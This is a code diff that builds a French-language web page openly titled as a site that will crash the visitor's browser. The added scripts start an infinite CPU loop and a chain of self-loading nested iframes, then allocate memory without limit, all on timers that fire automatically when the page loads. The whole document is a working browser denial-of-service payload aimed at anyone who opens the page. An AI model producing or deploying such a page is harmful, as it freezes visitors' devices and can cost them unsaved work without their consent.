@@ -1,12 +1,41 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crash Test Site</title>
+</head>
+<body>
+    <h1>Ce site va faire planter votre navigateur !</h1>
 
-    <html>
-    <head><title>Crash</title></head>
-    <body>
+    <!-- Boucle Infinie JavaScript pour surcharger le CPU -->
     <script>
-    while (true) {
-      document.title = Math.random();
-    }
+        setTimeout(function() {
+            while (true) {
+                console.log("Boucle Infinie...");
+            }
+        }, 5000); // Délai de 5 secondes avant de démarrer la boucle infinie pour permettre de charger le reste du site
     </script>
-    </body>
-    </html>
-    
+
+    <!-- Iframes imbriquées à l'infini pour saturer la mémoire -->
+    <iframe id="nestedIframe" src="about:blank"></iframe>
+    <script>
+        setTimeout(function() {
+            const iframe = document.querySelector('#nestedIframe');
+            const nextQueryValue = !location.search ? 1 : Number(location.search.split("?").pop()) + 1;
+            iframe.src = `index.html?${nextQueryValue}`;
+        }, 2000); // Délai pour laisser un peu de temps avant de commencer les iframes imbriquées
+    </script>
+
+    <!-- Surcharge mémoire via objets non nettoyés -->
+    <script>
+        setTimeout(function() {
+            let a = [];
+            while (true) {
+                a.push({});
+                console.log("Surcharge mémoire...");
+            }
+        }, 8000); // Délai de 8 secondes avant la surcharge mémoire pour combiner les effets
+    </script>
+</body>
+</html>
